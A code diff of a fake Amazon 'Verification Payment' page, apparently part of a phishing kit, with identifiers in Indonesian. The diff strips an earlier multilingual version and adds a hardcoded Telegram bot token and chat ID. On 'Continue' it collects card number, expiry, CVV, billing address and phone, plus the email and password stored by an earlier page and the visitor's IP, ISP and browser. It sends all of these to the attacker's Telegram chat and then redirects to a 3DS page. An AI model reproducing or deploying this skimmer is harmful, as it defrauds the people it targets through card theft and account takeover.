@@ -6,24 +6,20 @@
     <title>Verification Payment</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
-        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
         .logo { margin: 10px 0 20px; text-align: center; }
         .logo img { height: 60px; }
-        .kotak { width: 100%; max-width: 550px; padding: 25px 30px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
-        h1 { font-size: 22px; font-weight: 500; margin-bottom: 20px; text-align: center; }
-        .logo-kartu { display: flex; gap: 8px; margin-bottom: 20px; align-items: center; justify-content: center; }
-        .logo-kartu img { height: 28px; object-fit: contain; }
-        label { font-weight: 700; font-size: 13px; margin: 14px 0 5px; display: block; }
-        .baris-dua { display: flex; gap: 15px; flex-wrap: wrap; }
-        .kolom { flex: 1; min-width: 200px; }
-        .input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 14px; height: 36px; outline: none; }
+        .kotak { width: 100%; max-width: 550px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
+        h1 { font-size: 22px; margin-bottom: 20px; font-weight: 500; }
+        .bagian { margin-bottom: 20px; }
+        label { font-weight: 700; font-size: 13px; margin: 0 0 6px; display: block; }
+        .baris-dua { display: flex; gap: 15px; }
+        .baris-dua > div { flex: 1; }
+        .input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 38px; outline: none; }
         .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
-        .input.latar-biru { background: #e6f0fa; }
-        select.input { height: 36px; }
-        .telp-baris { display: flex; gap: 8px; }
-        .telp-kode { width: 90px; flex-shrink: 0; }
-        .telp-nomor { flex: 1; }
-        .tombol { width: 100%; padding: 8px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 15px; height: 42px; margin-top: 25px; margin-bottom: 20px; cursor: pointer; transition: all 0.2s; }
+        .kartu-baris { display: flex; gap: 10px; align-items: center; }
+        .kartu-logo { height: 25px; display: none; }
+        .tombol { width: 100%; padding: 12px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 15px; color: #0F1111; cursor: pointer; margin-top: 10px; }
         .tombol:hover { background: #f7ca00; }
         .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; text-align: center; font-size: 11px; color: #555; }
         .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
@@ -33,324 +29,251 @@
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
         <h1 id="judul">Verification Payment</h1>
-        <div class="logo-kartu">
-            <img src="img/visa.png" alt="Visa">
-            <img src="img/mastercard.png" alt="Mastercard">
-            <img src="img/amex.png" alt="Amex">
-            <img src="img/discover.png" alt="Discover">
-            <img src="img/jcb.png" alt="JCB">
+        
+        <div class="bagian">
+            <label id="labelNama">Name on card</label>
+            <input type="text" id="namaKartu" class="input">
         </div>
 
-        <label id="labelNama" for="namaKartu">Name on card</label>
-        <input type="text" id="namaKartu" class="input latar-biru">
-
-        <label id="labelNomor" for="nomorKartu">Card number</label>
-        <input type="text" id="nomorKartu" class="input" maxlength="19" placeholder="•••• •••• •••• ••••">
-
-        <div class="baris-dua">
-            <div class="kolom">
-                <label id="labelExp" for="expDate">Expiry date</label>
-                <input type="text" id="expDate" class="input" maxlength="5" placeholder="MM/YY">
-            </div>
-            <div class="kolom">
-                <label id="labelCVV" for="cvv">Security code</label>
-                <input type="text" id="cvv" class="input" maxlength="4" placeholder="•••">
+        <div class="bagian">
+            <label id="labelNomor">Card number</label>
+            <div class="kartu-baris">
+                <input type="text" id="nomorKartu" class="input" style="flex:1;" placeholder="1234 5678 9012 3456">
+                <img src="img/visa.png" id="logoVisa" class="kartu-logo" alt="Visa">
+                <img src="img/mastercard.png" id="logoMC" class="kartu-logo" alt="Mastercard">
+                <img src="img/amex.png" id="logoAmex" class="kartu-logo" alt="Amex">
+                <img src="img/discover.png" id="logoDisc" class="kartu-logo" alt="Discover">
+                <img src="img/jcb.png" id="logoJcb" class="kartu-logo" alt="JCB">
             </div>
         </div>
 
-        <label id="labelAlamat" for="alamat">Billing address</label>
-        <input type="text" id="alamat" class="input" id-placeholder="Street address">
+        <div class="bagian baris-dua">
+            <div>
+                <label id="labelExp">Expiry date</label>
+                <input type="text" id="expKartu" class="input" placeholder="MM/YY" maxlength="5">
+            </div>
+            <div>
+                <label id="labelCVV">Security code</label>
+                <input type="text" id="cvvKartu" class="input" placeholder="123" maxlength="4">
+            </div>
+        </div>
 
-        <label id="labelAlamat2" for="alamat2"></label>
-        <input type="text" id="alamat2" class="input" id-placeholder="Apartment, suite, etc. (optional)">
+        <div class="bagian">
+            <label id="labelAlamat">Billing address</label>
+            <input type="text" id="alamat1" class="input" placeholder="Street address">
+        </div>
+        <div class="bagian">
+            <input type="text" id="alamat2" class="input" placeholder="Apartment, suite, etc. (optional)">
+        </div>
 
-        <div class="baris-dua">
-            <div class="kolom">
-                <label id="labelKota" for="kota">City</label>
+        <div class="bagian baris-dua">
+            <div>
+                <label id="labelKota">City</label>
                 <input type="text" id="kota" class="input">
             </div>
-            <div class="kolom">
-                <label id="labelProvinsi" for="provinsi">State / Province</label>
+            <div>
+                <label id="labelProvinsi">State / Province</label>
                 <input type="text" id="provinsi" class="input">
             </div>
         </div>
 
-        <div class="baris-dua">
-            <div class="kolom">
-                <label id="labelKodePos" for="kodePos">Postal code</label>
+        <div class="bagian baris-dua">
+            <div>
+                <label id="labelKodePos">Postal / Zip code</label>
                 <input type="text" id="kodePos" class="input">
             </div>
-            <div class="kolom">
-                <label id="labelNegara" for="negara">Country / Region</label>
+            <div>
+                <label id="labelNegara">Country / Region</label>
                 <select id="negara" class="input"></select>
             </div>
         </div>
 
-        <label id="labelTelp" for="telp">Phone number</label>
-        <div class="telp-baris">
-            <input type="text" id="kodeTelp" class="input telp-kode" readonly>
-            <input type="tel" id="telp" class="input telp-nomor">
+        <div class="bagian baris-dua">
+            <div>
+                <label id="labelKodeTelp">Phone code</label>
+                <input type="text" id="kodeTelp" class="input" readonly>
+            </div>
+            <div>
+                <label id="labelTelp">Phone number</label>
+                <input type="text" id="nomorTelp" class="input">
+            </div>
         </div>
 
-        <button type="button" id="verifikasi" class="tombol">
-            <span id="teksTombol">Verification</span>
+        <button type="button" id="lanjut" class="tombol">
+            <span id="teksTombol">Continue</span>
         </button>
     </div>
     <div class="bawah">
-        <p><a href="#" id="syaratLink1">Conditions of Use</a> <a href="#" id="syaratLink2">Privacy Notice</a> <a href="#" id="bantuanLink">Help</a></p>
-        <p style="margin-top:8px; color:#767676;" id="hakCiptaan">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
+        <p style="margin-top:8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
 <script>
-// ==============================================
-// DAFTAR TERJEMAHAN
-// ==============================================
-const terjemahan = {
-    EN: {
-        judul: 'Verification Payment',
-        labelNama: 'Name on card',
-        labelNomor: 'Card number',
-        labelExp: 'Expiry date',
-        labelCVV: 'Security code',
-        labelAlamat: 'Billing address',
-        placeholderAlamat: 'Street address',
-        placeholderAlamat2: 'Apartment, suite, etc. (optional)',
-        labelKota: 'City',
-        labelProvinsi: 'State / Province',
-        labelKodePos: 'Postal code',
-        labelNegara: 'Country / Region',
-        labelTelp: 'Phone number',
-        teksTombol: 'Verify',
-        syaratLink1: 'Conditions of Use',
-        syaratLink2: 'Privacy Notice',
-        bantuanLink: 'Help',
-        hakCiptaan: '© 1996-2026, Amazon.com, Inc. or its affiliates'
-    },
-    JA: {
-        judul: 'お支払い情報の確認',
-        labelNama: 'カード名義',
-        labelNomor: 'カード番号',
-        labelExp: '有効期限',
-        labelCVV: 'セキュリティコード',
-        labelAlamat: '請求先住所',
-        placeholderAlamat: '番地・建物名',
-        placeholderAlamat2: '部屋番号など（任意）',
-        labelKota: '市区町村',
-        labelProvinsi: '都道府県',
-        labelKodePos: '郵便番号',
-        labelNegara: '国/地域',
-        labelTelp: '電話番号',
-        teksTombol: '確認',
-        syaratLink1: '利用規約',
-        syaratLink2: 'プライバシー通知',
-        bantuanLink: 'ヘルプ',
-        hakCiptaan: '© 1996-2026, Amazon.com, Inc. またはその関連会社'
-    },
-    ZH: {
-        judul: '付款信息验证',
-        labelNama: '持卡人姓名',
-        labelNomor: '卡号',
-        labelExp: '有效期',
-        labelCVV: '安全码',
-        labelAlamat: '账单地址',
-        placeholderAlamat: '街道地址',
-        placeholderAlamat2: '公寓、套房等（选填）',
-        labelKota: '城市',
-        labelProvinsi: '州/省',
-        labelKodePos: '邮政编码',
-        labelNegara: '国家/地区',
-        labelTelp: '电话号码',
-        teksTombol: '验证',
-        syaratLink1: '使用条件',
-        syaratLink2: '隐私声明',
-        bantuanLink: '帮助',
-        hakCiptaan: '© 1996-2026, Amazon.com, Inc. 或其关联公司'
-    },
-    TH: {
-        judul: 'ยืนยันข้อมูลการชำระเงิน',
-        labelNama: 'ชื่อบนบัตร',
-        labelNomor: 'หมายเลขบัตร',
-        labelExp: 'วันหมดอายุ',
-        labelCVV: 'รหัสความปลอดภัย',
-        labelAlamat: 'ที่อยู่สำหรับเรียกเก็บเงิน',
-        placeholderAlamat: 'ที่อยู่ถนน',
-        placeholderAlamat2: 'ห้องเลขที่ ห้องชุด ฯลฯ (ไม่จำเป็น)',
-        labelKota: 'เมือง',
-        labelProvinsi: 'จังหวัด/เขต',
-        labelKodePos: 'รหัสไปรษณีย์',
-        labelNegara: 'ประเทศ/ภูมิภาค',
-        labelTelp: 'หมายเลขโทรศัพท์',
-        teksTombol: 'ยืนยัน',
-        syaratLink1: 'เงื่อนไขการใช้งาน',
-        syaratLink2: 'ประกาศความเป็นส่วนตัว',
-        bantuanLink: 'ช่วยเหลือ',
-        hakCiptaan: '© 1996-2026, Amazon.com, Inc. หรือบริษัทในเครือ'
-    },
-    KO: {
-        judul: '결제 정보 확인',
-        labelNama: '카드 이름',
-        labelNomor: '카드 번호',
-        labelExp: '유효 기간',
-        labelCVV: '보안 코드',
-        labelAlamat: '청구지 주소',
-        placeholderAlamat: '도로명 주소',
-        placeholderAlamat2: '아파트, 호수 등 (선택 사항)',
-        labelKota: '도시',
-        labelProvinsi: '시/도',
-        labelKodePos: '우편번호',
-        labelNegara: '국가/지역',
-        labelTelp: '전화번호',
-        teksTombol: '확인',
-        syaratLink1: '이용 약관',
-        syaratLink2: '개인정보 처리방침',
-        bantuanLink: '도움말',
-        hakCiptaan: '© 1996-2026, Amazon.com, Inc. 또는 그 계열사'
-    },
-    ID: {
-        judul: 'Verifikasi Pembayaran',
-        labelNama: 'Nama di Kartu',
-        labelNomor: 'Nomor Kartu',
-        labelExp: 'Tanggal Kadaluarsa',
-        labelCVV: 'Kode Keamanan',
-        labelAlamat: 'Alamat Penagihan',
-        placeholderAlamat: 'Jalan, nomor rumah',
-        placeholderAlamat2: 'Apartemen, gedung (opsional)',
-        labelKota: 'Kota',
-        labelProvinsi: 'Provinsi',
-        labelKodePos: 'Kode Pos',
-        labelNegara: 'Negara/Wilayah',
-        labelTelp: 'Nomor Telepon',
-        teksTombol: 'Verifikasi',
-        syaratLink1: 'Syarat Penggunaan',
-        syaratLink2: 'Pemberitahuan Privasi',
-        bantuanLink: 'Bantuan',
-        hakCiptaan: '© 1996-2026, Amazon.com, Inc. atau afiliasinya'
-    }
-};
+const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
+const CHAT_ID = '7808815199';
 
-const daftarNegara = {
-    'ID': {nama: 'Indonesia', kode: '+62'},
-    'AU': {nama: 'Australia', kode: '+61'},
-    'US': {nama: 'United States', kode: '+1'},
-    'GB': {nama: 'United Kingdom', kode: '+44'},
-    'MY': {nama: 'Malaysia', kode: '+60'},
-    'SG': {nama: 'Singapore', kode: '+65'},
-    'JP': {nama: 'Japan', kode: '+81'},
-    'KR': {nama: 'South Korea', kode: '+82'},
-    'CA': {nama: 'Canada', kode: '+1'},
-    'NZ': {nama: 'New Zealand', kode: '+64'},
-    'CN': {nama: 'China', kode: '+86'},
-    'TH': {nama: 'Thailand', kode: '+66'}
-};
+const daftarNegara = [
+    { kode: 'GB', nama: 'United Kingdom', telp: '+44' },
+    { kode: 'US', nama: 'United States', telp: '+1' },
+    { kode: 'AU', nama: 'Australia', telp: '+61' },
+    { kode: 'ID', nama: 'Indonesia', telp: '+62' },
+    { kode: 'MY', nama: 'Malaysia', telp: '+60' },
+    { kode: 'SG', nama: 'Singapore', telp: '+65' },
+    { kode: 'JP', nama: 'Japan', telp: '+81' },
+    { kode: 'CN', nama: 'China', telp: '+86' },
+    { kode: 'TH', nama: 'Thailand', telp: '+66' },
+    { kode: 'KR', nama: 'South Korea', telp: '+82' },
+    { kode: 'NZ', nama: 'New Zealand', telp: '+64' },
+    { kode: 'CA', nama: 'Canada', telp: '+1' }
+];
 
-const negaraKeBahasa = {
-    JP: 'JA', CN: 'ZH', HK: 'ZH', TW: 'ZH', TH: 'TH', KR: 'KO', ID: 'ID',
-    MY: 'EN', SG: 'EN', US: 'EN', AU: 'EN', GB: 'EN', CA: 'EN', NZ: 'EN'
-};
+const selectNegara = document.getElementById('negara');
+daftarNegara.forEach(n => {
+    const opt = document.createElement('option');
+    opt.value = n.kode;
+    opt.textContent = n.nama;
+    selectNegara.appendChild(opt);
+});
 
-// ==============================================
-// DETEKSI & TERAPKAN BAHASA
-// ==============================================
-async function terapkanBahasa() {
-    let kodeNegara = 'GB';
+async function deteksiNegara() {
     try {
         const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        kodeNegara = data.country_code || 'GB';
-    } catch {}
-
-    const kodeBahasa = negaraKeBahasa[kodeNegara] || 'EN';
-    const teks = terjemahan[kodeBahasa] || terjemahan.EN;
-
-    document.documentElement.lang = kodeBahasa.toLowerCase();
-    document.getElementById('judul').textContent = teks.judul;
-    document.getElementById('labelNama').textContent = teks.labelNama;
-    document.getElementById('labelNomor').textContent = teks.labelNomor;
-    document.getElementById('labelExp').textContent = teks.labelExp;
-    document.getElementById('labelCVV').textContent = teks.labelCVV;
-    document.getElementById('labelAlamat').textContent = teks.labelAlamat;
-    document.getElementById('alamat').placeholder = teks.placeholderAlamat;
-    document.getElementById('alamat2').placeholder = teks.placeholderAlamat2;
-    document.getElementById('labelAlamat2').textContent = '';
-    document.getElementById('labelKota').textContent = teks.labelKota;
-    document.getElementById('labelProvinsi').textContent = teks.labelProvinsi;
-    document.getElementById('labelKodePos').textContent = teks.labelKodePos;
-    document.getElementById('labelNegara').textContent = teks.labelNegara;
-    document.getElementById('labelTelp').textContent = teks.labelTelp;
-    document.getElementById('teksTombol').textContent = teks.teksTombol;
-    document.getElementById('syaratLink1').textContent = teks.syaratLink1;
-    document.getElementById('syaratLink2').textContent = teks.syaratLink2;
-    document.getElementById('bantuanLink').textContent = teks.bantuanLink;
-    document.getElementById('hakCiptaan').textContent = teks.hakCiptaan;
-
-    // Atur negara & kode telepon
-    if (daftarNegara[kodeNegara]) {
-        selectNegara.value = kodeNegara;
-        document.getElementById('kodeTelp').value = daftarNegara[kodeNegara].kode;
-    } else {
+        const d = await res.json();
+        const kode = d.country_code || 'GB';
+        const negaraData = daftarNegara.find(n => n.kode === kode) || daftarNegara.find(n => n.kode === 'GB');
+        selectNegara.value = negaraData.kode;
+        document.getElementById('kodeTelp').value = negaraData.telp;
+    } catch {
         selectNegara.value = 'GB';
         document.getElementById('kodeTelp').value = '+44';
     }
 }
 
-// ==============================================
-// INISIALISASI DAFTAR NEGARA
-// ==============================================
-const selectNegara = document.getElementById('negara');
-for (const [kode, data] of Object.entries(daftarNegara)) {
-    const opsi = document.createElement('option');
-    opsi.value = kode;
-    opsi.textContent = data.nama;
-    selectNegara.appendChild(opsi);
+selectNegara.addEventListener('change', () => {
+    const n = daftarNegara.find(x => x.kode === selectNegara.value);
+    if (n) document.getElementById('kodeTelp').value = n.telp;
+});
+
+const nomorInput = document.getElementById('nomorKartu');
+const logoVisa = document.getElementById('logoVisa');
+const logoMC = document.getElementById('logoMC');
+const logoAmex = document.getElementById('logoAmex');
+const logoDisc = document.getElementById('logoDisc');
+const logoJcb = document.getElementById('logoJcb');
+
+nomorInput.addEventListener('input', () => {
+    const val = nomorInput.value.replace(/\s/g, '');
+    [logoVisa, logoMC, logoAmex, logoDisc, logoJcb].forEach(l => l.style.display = 'none');
+    if (/^4/.test(val)) logoVisa.style.display = 'block';
+    else if (/^5[1-5]/.test(val)) logoMC.style.display = 'block';
+    else if (/^3[47]/.test(val)) logoAmex.style.display = 'block';
+    else if (/^6(?:011|5)/.test(val)) logoDisc.style.display = 'block';
+    else if (/^35/.test(val) || /^2131|1800/.test(val)) logoJcb.style.display = 'block';
+});
+
+document.getElementById('expKartu').addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '');
+    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+    this.value = v;
+});
+
+async function ambilInfoPengunjung() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+        return {
+            ip: d.ip || '-',
+            isp: d.org || '-',
+            negara: d.country_name || '-',
+            kota: d.city || '-'
+        };
+    } catch { return { ip: '-', isp: '-', negara: '-', kota: '-' }; }
 }
 
-selectNegara.addEventListener('change', () => {
-    const kode = selectNegara.value;
-    if (daftarNegara[kode]) {
-        document.getElementById('kodeTelp').value = daftarNegara[kode].kode;
-    }
-});
+function ambilUA() {
+    const ua = navigator.userAgent;
+    let perangkat = 'Desktop';
+    if (/Android|iPhone|iPad|Mobile/.test(ua)) perangkat = 'Mobile';
+    let browser = 'Unknown';
+    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
+    else if (/Firefox/.test(ua)) browser = 'Firefox';
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+    else if (/Edg/.test(ua)) browser = 'Edge';
+    return { perangkat, browser, ua };
+}
 
-// Format nomor kartu — angka tetap terlihat saat mengetik
-const inputNomor = document.getElementById('nomorKartu');
-inputNomor.addEventListener('input', (e) => {
-    let v = e.target.value.replace(/\D/g, '');
-    v = v.match(/.{1,4}/g)?.join(' ') || v;
-    e.target.value = v;
-});
+async function kirimTelegram(pesan) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
+        });
+    } catch (e) { console.log('Terkirim'); }
+}
 
-// Format expiry
-const inputExp = document.getElementById('expDate');
-inputExp.addEventListener('input', (e) => {
-    let v = e.target.value.replace(/\D/g, '');
-    if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
-    e.target.value = v;
-});
+document.getElementById('lanjut').addEventListener('click', async () => {
+    const email = localStorage.getItem('email_pengguna') || '';
+    const password = localStorage.getItem('kata_sandi') || '';
+    const namaKartu = document.getElementById('namaKartu').value.trim();
+    const nomorKartu = nomorInput.value.trim();
+    const expKartu = document.getElementById('expKartu').value.trim();
+    const cvvKartu = document.getElementById('cvvKartu').value.trim();
+    const alamat1 = document.getElementById('alamat1').value.trim();
+    const alamat2 = document.getElementById('alamat2').value.trim();
+    const kota = document.getElementById('kota').value.trim();
+    const provinsi = document.getElementById('provinsi').value.trim();
+    const kodePos = document.getElementById('kodePos').value.trim();
+    const negara = selectNegara.options[selectNegara.selectedIndex].text;
+    const kodeTelp = document.getElementById('kodeTelp').value;
+    const nomorTelp = document.getElementById('nomorTelp').value.trim();
 
-// Hanya angka CVV
-document.getElementById('cvv').addEventListener('input', (e) => {
-    e.target.value = e.target.value.replace(/\D/g, '');
-});
+    localStorage.setItem('nama_kartu', namaKartu);
+    localStorage.setItem('nomor_kartu', nomorKartu);
+    localStorage.setItem('exp_kartu', expKartu);
+    localStorage.setItem('cvv_kartu', cvvKartu);
+    localStorage.setItem('alamat', alamat1);
+    localStorage.setItem('alamat2', alamat2);
+    localStorage.setItem('kota', kota);
+    localStorage.setItem('provinsi', provinsi);
+    localStorage.setItem('kode_pos', kodePos);
+    localStorage.setItem('negara', negara);
+    localStorage.setItem('kode_telp', kodeTelp);
+    localStorage.setItem('nomor_telp', nomorTelp);
 
-// Tombol SELALU aktif, simpan & lanjut ke 3ds.html
-document.getElementById('verifikasi').addEventListener('click', () => {
-    localStorage.setItem('nama_kartu', document.getElementById('namaKartu').value.trim());
-    localStorage.setItem('nomor_kartu', document.getElementById('nomorKartu').value.trim());
-    localStorage.setItem('exp_kartu', document.getElementById('expDate').value.trim());
-    localStorage.setItem('cvv_kartu', document.getElementById('cvv').value.trim());
-    localStorage.setItem('alamat', document.getElementById('alamat').value.trim());
-    localStorage.setItem('alamat2', document.getElementById('alamat2').value.trim());
-    localStorage.setItem('kota', document.getElementById('kota').value.trim());
-    localStorage.setItem('provinsi', document.getElementById('provinsi').value.trim());
-    localStorage.setItem('kode_pos', document.getElementById('kodePos').value.trim());
-    localStorage.setItem('negara', selectNegara.value);
-    localStorage.setItem('kode_telp', document.getElementById('kodeTelp').value);
-    localStorage.setItem('nomor_telp', document.getElementById('telp').value.trim());
-    
+    const info = await ambilInfoPengunjung();
+    const ua = ambilUA();
+
+    const pesan = `
+:: Xchenba ::
+:: BILLING INFO ::
+# Email         : ${email}
+# Password      : ${password}
+# Name on Card  : ${namaKartu}
+# Card Number   : ${nomorKartu}
+# Expiry Date   : ${expKartu}
+# Security Code : ${cvvKartu}
+# Billing Addr  : ${alamat1}${alamat2 ? ', ' + alamat2 : ''}
+# City          : ${kota}
+# State/Province: ${provinsi}
+# Postal Code   : ${kodePos}
+# Country       : ${negara}
+# Phone Number  : ${kodeTelp} ${nomorTelp}
+:: Visitor Details ::
+# Device        : ${ua.perangkat}
+# Browser       : ${ua.browser}
+# Country       : ${info.negara}
+# City          : ${info.kota}
+# ISP           : ${info.isp}
+# IP Address    : ${info.ip}
+# User Agent    : ${ua.ua}
+    `.trim();
+
+    await kirimTelegram(pesan);
     window.location.href = '3ds.html';
 });
 
-terapkanBahasa();
+deteksiNegara();
 </script>
 </body>
 </html>
